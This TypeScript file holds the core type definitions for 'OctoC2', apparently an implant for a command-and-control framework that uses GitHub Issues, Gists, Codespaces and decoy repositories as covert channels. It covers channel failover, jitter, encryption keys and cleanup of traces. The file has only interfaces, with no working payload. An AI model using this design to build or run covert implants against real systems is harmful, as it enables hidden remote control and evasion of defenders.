/**
 * OctoC2 Implant — Core Type Definitions
 *
 * Every tentacle (communication channel) and the ConnectionFactory
 * operate against these shared interfaces. Phase 2 fills in the
 * concrete implementations.
 */

// ── Beacon identity ────────────────────────────────────────────────────────────

import type {
  ChannelKind,
  CheckinPayload,
  GitHubTokenLease,
  Task,
  TaskKind,
  TaskResult,
} from "@octoc2/shared";
import type { BeaconState } from "./state/BeaconState.ts";

export type { CheckinPayload, Task, TaskKind, TaskResult };

export interface BeaconConfig {
  /** Unique beacon ID (generated once at first run, persisted) */
  id: string;
  /** GitHub org/repo where the C2 "head" lives */
  repo: { owner: string; name: string };
  /**
   * Current scoped GitHub credential: an explicitly supplied fine-grained
   * token or the token carried by githubTokenLease.
   */
  token: string;
  /** Short-lived, server-issued GitHub App installation token lease. */
  githubTokenLease?: GitHubTokenLease;
  /** Dedicated user credential for Gist; never replaced by an App lease. */
  gistToken?: string;
  /** Unique controller API credential; never reused as a GitHub credential. */
  controllerToken?: string;
  /** Tentacle priority order — tried left-to-right, failover on error */
  tentaclePriority: TentacleKind[];
  /** Sleep interval between checkins (seconds) + jitter (0–1 fraction) */
  sleepSeconds: number;
  jitter: number;
  /** libsodium public key of the operator (for encrypting task results) */
  operatorPublicKey: Uint8Array;
  /** This beacon's libsodium key pair (generated at first run) */
  beaconKeyPair: { publicKey: Uint8Array; secretKey: Uint8Array };
  /** Pre-provisioned Ed25519 signing identity, distinct from X25519. */
  signingKeyPair?: { publicKey: Uint8Array; secretKey: Uint8Array };
  signingKeyId?: string;
  /** Controller URL used by direct transports and recovery. */
  serverUrl?: string;
  /** Trusted recovery signer and last accepted monotonic generation. */
  recoverySigningPublicKey?: Uint8Array;
  recoverySigningKeyId?: string;
  recoveryGeneration?: number;
  /** Shared persistent state and bounded at-most-once task ledger. */
  state?: BeaconState;
  /** Internal Issues transport state scope. Proxy routes use one scope per decoy repository. */
  issuesStateScope?: string;
  /** Provisioned issue number for an Issues transport with route-specific state. */
  issuesIssueNumber?: number;
  /** Require the repository monitoring key to match the signed configuration. */
  issuesRequireOperatorKeyMatch?: boolean;
  /** Internal registration-ACK window; proxy relays allow for Actions queue latency. */
  issuesRegistrationAckTimeoutMs?: number;
  /** Relay consortium entries (baked via OCTOC2_RELAY_CONSORTIUM at build time) */
  relayConsortium?: RelayConfig[];
  /** Authenticated OctoProxy route supplied by the latest signed recovery record. */
  proxyRepos?: ProxyConfig[];
  /** Delete result comments older than this many days (0 = immediate). Omit to disable. */
  cleanupDays?: number;
}

// ── Tentacle channel types ─────────────────────────────────────────────────────

export type TentacleKind = ChannelKind;

export type ResultAcceptance =
  | "direct-response"
  | "channel-receipt";

export interface ResultSubmissionOutcome {
  artifactWritten: boolean;
  controllerAccepted: boolean;
  channel: TentacleKind | null;
  acceptance: ResultAcceptance | null;
}

// ── Task / Result message envelope ────────────────────────────────────────────

// ── Checkin / heartbeat ────────────────────────────────────────────────────────

// ── Tentacle interface ─────────────────────────────────────────────────────────

export interface ITentacle {
  readonly kind: TentacleKind;
  /** Is this channel currently usable? (auth valid, rate limit ok, etc.) */
  isAvailable(): Promise<boolean>;
  /** Send checkin; return list of pending tasks */
  checkin(payload: CheckinPayload): Promise<Task[]>;
  /** Submit a completed task result */
  submitResult(result: TaskResult): Promise<ResultSubmissionOutcome>;
  /** Graceful teardown (close connections, cancel subscriptions) */
  teardown(): Promise<void>;
}

// ── ConnectionFactory options ──────────────────────────────────────────────────

export interface ConnectionFactoryOptions {
  config: BeaconConfig;
  /** Max consecutive failures before a tentacle is marked degraded */
  maxFailures?: number;
  /** How long (ms) a degraded tentacle waits before retrying */
  degradedCooldownMs?: number;
}

// ── Relay consortium ─────────────────────────────────────────────────────────

export interface RelayConfig {
  /** GitHub account that owns the relay Codespace */
  account: string;
  /** Repository to look up the Codespace SSH endpoint in */
  repo:    string;
}

// ── OctoProxy decoy repo config ───────────────────────────────────────────────

export interface ProxyConfig {
  owner:     string;               // decoy GitHub org or user
  repo:      string;               // decoy repo name
  githubTokenLease: GitHubTokenLease; // signed, short-lived, repository-bound lease
  innerKind: 'issues';             // the relay workflow transports issue comments
  decoyIssue: number;              // provisioned issue watched by the decoy workflows
}
